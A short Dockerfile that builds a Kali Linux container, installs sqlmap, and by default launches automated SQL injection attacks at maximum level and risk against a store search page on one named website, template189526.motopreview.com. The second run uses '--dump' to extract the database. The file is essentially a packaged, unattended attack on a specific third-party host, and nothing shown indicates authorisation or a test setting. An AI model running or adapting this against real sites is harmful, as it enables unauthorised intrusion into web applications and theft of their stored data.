FROM kalilinux/kali-rolling

WORKDIR /root

RUN apt -y update && DEBIAN_FRONTEND=noninteractive apt -y dist-upgrade && apt -y autoremove && apt clean

RUN apt -y install python3-pip

RUN DEBIAN_FRONTEND=noninteractive apt -y install sqlmap

CMD sqlmap -u "https://template189526.motopreview.com/store/category/search/?keyword=1" --random-agent --level 5 --risk 3 --batch && sqlmap -u "https://template189526.motopreview.com/store/category/search/?keyword=1*" --random-agent --level 5 --risk 3 --batch --timeout=10 --drop-set-cookie -o --dump